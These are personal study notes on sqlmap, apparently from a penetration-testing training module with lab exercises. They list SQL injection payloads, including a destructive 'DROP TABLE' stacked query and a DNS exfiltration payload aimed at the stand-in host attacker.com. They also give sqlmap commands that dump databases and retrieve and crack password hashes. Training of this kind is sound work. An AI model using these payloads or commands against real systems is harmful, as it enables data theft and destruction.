
## SQLMap Overview 

sqlmap is an open-source pen testing tool that automates the detection and exploitation of sql injection flaws 

`python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5`

contains options and switches for: 
- target connection 
- enumeration
- database content retrieval 
- injection detection 
- optimization
- file system access
- fingerprinting 
- protection detection and bypass using "tamper" scripts
- execution of the OS commands 

you can install with: 

`sudo apt install sqlmap`

manual installation: 

`git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev'

then you can run sqlmap with: 

`python sqlmap.py`

there are many supported databases: 

![](../Images/Pasted%20image%2020240105185232.png)

you can see the supported SQL injections with `sqlmap -hh`

BEUSTQ technique characters: 
- `B` = boolean-based blind 
- `E` = Error-based 
- `U` = union query-based 
- `S` = stacked queries 
- `T` = time-based blind 
- `Q` = inline queries

### Boolean-based blind SQL injection 

`AND 1=1`

sqlmap exploits boolean-based blind sql injection through the differentiation of TURE from FALSE query results   
retrieving 1 byte of info per request  
differentiation is based on server responses to see if it returned TRUE of FALSE   
could be from raw response content, HTTP codes, page titles, filtered text, etc. 

TRUE = generally based on responses having none or small difference to regular server response  
FALSE = substantial differences form regular server response  

boolean-based blind SQL injection is most common SQLi type in web apps 

### Error-based SQL injection 

`AND GTID_SUBSET(@@version,0)`

if the database management system (DBMS) errors are being returned in the server response then there is a chance that they can be used to carry the results for requested queries  
so you can target functions that cause known misbehaviors with specific payloads  

sqlmap has the biggest list of these payloads and covers error-based SQL injections for: 

- MySQL 
- microsoft SQL server 
- IBM DB2 
- PostgreSQL 
- Sybase 
- Firebird
- Oracle 
- Vertica
- MonetDB

error-based SQLi are considered to be the fastest, except for UNION query-based, because it can retrieve a limited amount of data called "chunks" through each request 

### UNION query-based

`UNION ALL SELECT 1, @@version,3`

using UNION makes is possible to extend the original (vulnerable) query with the injected statements' results   
attacker can get additional results from the injected statements within the page response itself  

considered the fastest because the attacker could pull the content of the entire database with a single request 

### Stacked queries 

`; DROP TABLE users`

stacking queries also known as piggy-backing is injecting additional SQL statements after the vulnerable one 

if there is a requirement for running non-query statements like INSERT, UPDATE, DELETE then stacking must be supported by the vulnerable platform (microsoft sql server and postgresql support by default) 

SQLmap can use such vulnerabilities to run non-query statements executed in advanced features like execution of OS commands and data retrieval like time-based blind sqli types

### Time-based blind SQL injection 

`AND 1=IF(2>1,SLEEP(5),0)`

similar to boolean-based blind sql injection but the response time is used as the source for the differentiation between TRUE and FALSE 

TRUE = noticeable difference between response time of regular server response  
FALSE = response time indistinguishable from regular response times 

much slower than boolean-based sqli since TRUE queries would delay the server response  
usually used when boolean-based is not applicable  
for example, when statement is a non-query 

### Inline queries 

`SELECT (SELECT @@version) from`

embeds a query within the original query  
uncommon because it requires the web app to be written in a certain way  

### Out-of-band SQL injection 

`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

one of the most advanced types of sqli  
used in cases where all other types are either unsupported or too slow  
sqlmap supports these through DNS exfiltration where requested queries are retrieved through DNS traffic  

running sqlmap on the dns server for the domain under control (.attacker.com) allows sqlmap to perform the attack by forcing the server to request non-existent subdomains (foo.attacker.com) where foo would be the SQL response we want  
sqlmap collects the erroring DNS requests and collects the foo part to form the entire sql response 

## Getting Started with SQLMap 

in a simple scenario, there is a web page that accepts user input via a GET parameter (ex: id)  
you want to test if the web page is affected by a SQL injection  
if so then you will want to exploit it and get as much info as you can  
possibly even try to access the underlying file system and execute OS commands 

some vulnerable php code could look like: 

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

there will be an error reported as part of the web-server response in case of any sql query problems  
these will make SQLi detection easier

basic command on a url would look like: 

`sqlmap -u "http://www.example.com/vuln.php?id=1 --batch`

## SQLMap Output Description 

sqlmap output shows exactly what vulnerabilities sqlmap is exploiting  

there are many common messages found from a can of SQLMap 
### URL content is stable

"target URL content is stable"

no major changes between responses in case of continuous identical requests 

in the event of stable responses, it is easier to spot the difference caused by SQLi attempts 

### Parameter appears to be dynamic

"GET parameter 'id' appears to be dynamic"

always desired for parameter to be dynamic = any changes made to its value results in a change in its response; parameter may be linked to a database  

if it is static then it could be an indicator that the value is not processed by the target 

### Parameter might be injectable 

"heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DMBS: 'MySQL')"

in this case there was a DBMS error that looks like it could be from MySQL which means that the target could be injectable with MySQL 

### Parameter might be vulnerable to XSS attacks 

"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

sqlmap also does quick XSS scans 

### Back-end DMBS is '...'

"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DMBSes? Y/n" 

this will show up if it is clear that the target is using a specific DBMS 

### Level/risk values

"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? Y/n"

if it is clear that there is a specific DBMS being used then it is also possible to extend the tests for that same specific DBMS beyond the basic tests  

if it isn't known what DBMS is being used then it will only use the top payloads 

### Reflective values found 

"reflective values found and filtering out"

warning that parts of the used payload are found in the response  
this could cause problems to automation tools, so SQLMap filters it out 

### Parameter appears to be injectable 

"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

could be injectable  
boolean-based and time-based blinds are likely to have false-positives but SQLmap will try to filter these at the end 

"with --string="luther"" = recognized and used the appearance of constant string value luther in the response for distinguishing TRUE and FALSE responses  
this means that there will be no need for advanced internal mechanisms like dynamicity/reflection or fuzzy comparison of responses which can't be considered as false-positive 
### Time-based comparison statistical model 

"time-based comparison requires a larger statistical model, please wait.... (done)"

sqlmap uses stat model for the recognition of regular response times  
this requires a sufficient number of regular response times so that it can distinguish between deliberate delay even in the high-latency network environments 

### Extending UNION query injection technique tests 

"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

require a lot more requests for successful recognition of usable payload than other SQLi  
sqlmap will typically cap the number of requests to lower testing time  
but if there is a good chance that the target is vulnerable, meaning a vulnerability was possibly found, then it extends the cap 

### Technique appears to be usable 

"'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

as a heuristic check for UNION-query types, sqlmap will use ORDER BY before actual UNION payloads are sent  
if this works then sqlmap can recognize the correct number of required UNION columns by conducting the binary-search approach 

### Parameter is vulnerable 

"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? y/N"

there was indeed a parameter found to be vulnerable, and you can opt to take this as the first one and exit or continue searching for all vulnerabilities 

### Sqlmap identified injection points 

"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

after this is a list of all injection points with type, title, and payloads  

will only list for findings that are provably exploitable 

### Data logged to text files

"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"

shows where all logs, sessions, and output data was stored for the target 

if an injection point is found, all details for future runs are stored in the same directory  
sqlmap tries to reduce the required target requests as much as possible, depending on the session files data 

## Running SQLMap on an HTTP Request 

there are many options to set up an HTTP request before usage  
improper cookie values, over complicated setups, or improper declaration of POST data will prevent correct detection of SQLl  

one of the best way to set up a SQLMap request is using the copy cURL feature in the browser network tab 

you can copy the cURL command and simply replace curl with sqlmap to get a working command: 

```shell
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

when providing data for testing in SQLmap, there needs to either be a parameter that could be accessed for SQLi or specialized options/switches for auto parameter finding like `--crawl` or `-g`

### GET/POST requests 

typically GET parameters are provided with the `-u` or `--url` options  
for testing POST data the `--data` flag is used 

`sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`

if you know that there is only one parameter that you want to test you can use `-p` or a `*` after the parameter like: 

`'uid=1*&name=test`

### Full HTTP requests 

if we need to do more complex HTTP requests with lots of header values and elongated POST body, we can use `-r`  
this will be used to provide a request file containing the whole request  
you can capture these types of requests with proxy apps like Burp 

for example: 

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

you can either manually copy the request from within burp and write to file or right click the request in burp and choose copy to file 

you can do this through the browser by doing `Copy > Copy Request Headers` 

`sqlmap -r req.txt`

similar to how we use `--data` we can specify the parameter we want to inject in with an `*`: 

`/?id=*`

### Custom SQLMap Requests 

many options to customize for specific request options

if you needed to specify the session cookie value you could use `--cookie`: 

`sqlmap ... --cookie='newcookievalue'`

or using the `-H` or `--header`: 

`sqlmap ... -H='Cookie:PHPSESSID=abcdeqwerasdfasdf'`

we can apply the same to other options like `--host`, `--referer`, and `-A/--user-agent` which are also used to specify the header values 

`--random-agent` randomly selects User-agent header values  
this is important because more and more protections recognize and block SQLMap's User-agent value `User-agent:sqlmap/1.4.9.12#dev (http://sqlmap.org)`  
can also use `--mobile` to imitate the smartphone 

sqlmap by default only targets HTTP parameters but can also choose to test the headers  
easiest way is to specify the custom injection mark after the header's value  
`--cookie=id1*`  
this applies to any other part of the request 

can also specify different methods like `--method PUT`

### Custom HTTP requests

sqlmap also supports JSON formatted (`{"id":1}`) and XML formatted (`<element><id>1</id></element>`) http requests 

no strict restraints on how the parameter values are stored inside  
if POST body is simple and short you can just use `--data`  
however we can again use `-r` for longer ones 

### Example Queries 

with our target IP and port we can see a page with different exercises: 

![](../Images/Pasted%20image%2020240107184822.png)

for this section lets start with case 2: 

![](../Images/Pasted%20image%2020240107184903.png)

we have a text field and submit button that we want to inject on with a POST request 

lets grab the POST request and use it as our command: 

![](../Images/Pasted%20image%2020240107185106.png)

we know that we want to inject on the id parameter so I use `*` to specify it  
I also use `--batch` and `--dump` to get output files  

we get our first flag: 

![](../Images/Pasted%20image%2020240107185323.png)

for case 3 we are looking to inject on the id cookie value: 

![](../Images/Pasted%20image%2020240107185458.png)

for this I add an `*` to the cookie field for id:

![](../Images/Pasted%20image%2020240107185610.png)

we can then find the flag for case 3: 

![](../Images/Pasted%20image%2020240107185844.png)

for case 4 we want to inject on the JSON value of id: 

![](../Images/Pasted%20image%2020240107190238.png)

since the JSON data is simple I just add the content to the `--data` parameter: 

![](../Images/Pasted%20image%2020240107190639.png)

and we can see the flag for case 4: 

![](../Images/Pasted%20image%2020240107190626.png)

## Handling SQLMap Errors 

there could be many errors with HTTP requests 

### Display errors 

first step is usually to switch the `--parse-errors` option to parse the DBMS errors and display them 

### Store the traffic 

`-t` stores the whole traffic content to an output file: 

`sqlmap -u "http..." --batch -t /tmp/traffic.txt`

this will contain all sent and received HTTP requests 

### Verbose output 

`-v` raises verbosity level: 

`sqlmap -u 'http://...' -v 6 --batch`

### Using proxy 

`--proxy` will redirect all traffic through MITM proxy like burp 

## Attack Tuning 

sqlmap should mostly work out of the box for most scans, but there are ways to fine tune 

every payload consists of: 
- vector (ex: `UNION ALL SELECT 1,2,VERSION()`), carries the useful SQL code to be executed 
- boundaries (ex: `<vector>-- -`), prefix and suffix formations; used for proper injection into the vulnerable SQL statement 

### Prefix/suffix 

in rare cases there is a need for prefix and suffixes not covered by the normal sqlmap run, to use them you can use `--prefix` and `--suffix`

`sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`

the above command will result in an enclosure of all vectors between the prefix and suffix values

if this is the vulnerable code: 

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

then the vector would look like: 

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

### Level/risk 

sqlmap uses a default set of the most common boundaries and vectors, but you can still use bigger sets of them 

to use different options you can specify the `--level` and `--risk` values: 
- `--level` (1-5, default 1) extends both vectors and boundaries based on expectancy of success; the lower the expectancy the higher the level 
- `--risk` (1-3, default 1) extends the used vector based on their risk of causing problems for the target such as database entry loss or DoS 

you can check the differences between the used boundaries and payloads for different values of `--level` and `--risk` with `-v`  
with verbosity level 3 or higher you can see payloads 

regular users are encouraged not to change these values but in cases like where usage of OR payloads is necessary (like in login pages) we might have to raise the risk level ourselves   
OR payloads are inherently dangerous where underlying vulnerable SQL statements are actively modifying the databases (UPDATE and DELETE)

### Advanced Tuning

when dealing with huge target responses with dynamic content, subtle differences between TURE and FALSE could be used for detection  
if the difference between TRUE and FALSE can be seen in HTTP codes, you can use `--code` to fixate TRUE responses to a specific code: 

`--code=200`

can also use `--titles` if the difference between TRUE and FALSE can be seen in the HTTP page titles; checks the `<title>` tag

`--string` can check for specific string values being present in TRUE responses: `--string=success`

if there is a lot of hidden content like `<script>`, `<style>`, or `<meta>` you can use the `--text-only` option to remove all HTML tags and bases the comparison on the textual content only 

sometimes we want to narrow down the payloads to only a certain type  
if time-based blind payloads are taking too long or if we want to force the usage of a specific payload type we can use `--technique`

if we wanted to only use boolean-based blind, error-based, and UNION-query payloads we would do: 

`--technique=BEU`

sometimes UNION payloads require extra user-provided info to work  
if we can find the exact number of columns of the vulnerable SQL query we can specify it with `--union-cols`: 

`--union-cols=17`

if the default dummy values that sqlmap uses like -NULL and random integers are not compatible with values from results of the vulnerable SQL query then we can specify our own values with `--union-char='a'` 

if there is a requirement to use an appendix at the end of a UNION query in the form of the `FROM <table>` (like with Oracle) we can set it with `--union-form`: 

`--union-from`

using the wrong FROM appendix automatically may be due to the inability to detect the correct DBMS 

for the next set of questions we start with case 5 which we need to exploit an OR SQLi with the id parameter: 

![](../Images/Pasted%20image%2020240108145026.png)

I use the `--risk` option to use the higher risk payloads which will include OR statements: 

![](../Images/Pasted%20image%2020240108145511.png)

from this I can get the flag: 

![](../Images/Pasted%20image%2020240108145543.png)

I could have also used the `-T flag5` option to specify only the table I want to see  
also the `--no-cast` flag to ensure that the correct content is displayed

for flag 6 we want to use non-standard boundaries and inject on the col parameter: 

![](../Images/Pasted%20image%2020240108145735.png)

for this I use `--level` to use the non-standard boundaries, and set the level to 5  
however, this did not get the flag on it's own  
in order to get the flag I needed to specify a prefix: 

![](../Images/Pasted%20image%2020240108151348.png)

then I was able to get the flag: 

![](../Images/Pasted%20image%2020240108151415.png)

for flag 7 we want to use UNION SQLi injections on the id parameter: 

![](../Images/Pasted%20image%2020240108151536.png)

to start I specified the `--technique=U` to only use UNION payloads: 

![](../Images/Pasted%20image%2020240108152403.png)

which resulted in the flag: 

![](../Images/Pasted%20image%2020240108152351.png)

I also tried specifying the `--union-cols=9` to match the table output

## Database Enumeration 

enumeration happens after successful detection and confirmation of exploitability of SQLi vulnerability   
lookup and retrieval of all available info from the vulnerable database 

sqlmap has a predefined set of queries for all supported DBMSs where each entry has the SQL that must be run to get the desired content 

after successful detection of vulnerability, we can begin enumeration of basic details like hostname of the target `--hostname`, current user's name (`--current-user`), current database name (`--current-db`), or password hashes (`--passwords`) 

usually starts with basic info: 
- database version banner `--banner` 
- current user name `--current-user`
- current database name `--current-db` 
- checking if current user has DBA rights 

to do all of this you can use the following command: 

`sqlmap -u "http://example.com/?id=1" --banner --current-user --current-db --is-dba`

### Table enumeration 

after finding the current database name, the retrieval of table names can be done by using `--tables` and specifying the DB name with `-D testdb`

`sqlmap -u "http://example.com/?id=1" --tables -D testdb`

you can then retrieve a specific table's content with `--dump` and specifying the table with `-T users`: 

`sqlmap -u "http://example.com/?id=1" --dump -T users -D testdb`

this will output to csv but you can specify the output format with the option `--dump-format` and setting it to HTML or SQLite 

### Table/row enumeration 

if we have a large table with many columns or rows we can specify the columns like `name` with the `-C` option: 

`sqlmap -u http://example.com/?id=1" --dump -T users -D testdb -C name,surname`

to narrow down the rows based on their ordinal numbers we can use `--start` and `--stop`: 

`sqlmap -u "http://example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3`

### Conditional enumeration 

we can get certain rows using WHERE logic with the `--where` option: 

`sqlmap -u ... --dump -T users -D testdb --where="name LIKE 'f%'"`

### Full DB enumeration 

we can also retrieve all tables inside the database by skipping the usage of `-T` by just using the `--dump` option without specifying a table  

`--dump-all` will dump all content from all the databases   
in these cases, users are suggested to use the `--exclude-sysdbs`, which will skip the retrieval of content from system databases 

for this module we will look at case 1 which wants us to exploit the parameter id: 

![](../Images/Pasted%20image%2020240108210359.png)

we are looking for a flag in the testdb database so first lets check for vulnerabilities: 

![](../Images/Pasted%20image%2020240108210753.png)

we know that we are looking for the testdb database and flag1 table so when we specify them we can see the flag: 

![](../Images/Pasted%20image%2020240108210831.png)

## Advanced Database Enumeration 

if we want to get the structure of all the tables so that we have an overview of the db architecture, you can use `--schema`:

`sqlmap -u ... --schema`

we can search for dbs, tables, and columns with the `--search` option  
lets us search for identifier names by using the LIKE operator: 

`sqlmap -u ... --search -T user`

this would search for table names with the keyword user 

you can also search for all column names based on a keyword: 

`sqlmap -u ... --search -C pass`

using `--dump` will ask to crack passwords found in databases with dictionary attacks 

there is support for cracking 31 different types of hash algorithms, and a dictionary of many common passwords from leaks 

you can also dump the content of system tables containing database-specific credentials (like connection credentials) with `--passwords`: 

`sqlmap -u ... --passwords --batch`

using the `--all` switch with the `--batch` switch will do the entire enumeration process on the target itself   
this means that it will do all enumeration steps and display them, but this will take a long time 

for this module's questions we will look at case 1 again: 

![](../Images/Pasted%20image%2020240109155911.png)

first I want to find the column with "style" in it's name

for this I will use `--search -C style` to look for columns with the keyword in it: 

![](../Images/Pasted%20image%2020240109160125.png)

by searching using LIKE I can see the resulting column: 

![](../Images/Pasted%20image%2020240109160241.png)

next I want to find the user Kimberly's password

for this I simply use `--dump` and allow for the dictionary password crack attempts:

![](../Images/Pasted%20image%2020240109161129.png)

and I then search the dump file for the specific user to see the cracked password: 

![](../Images/Pasted%20image%2020240109161808.png)
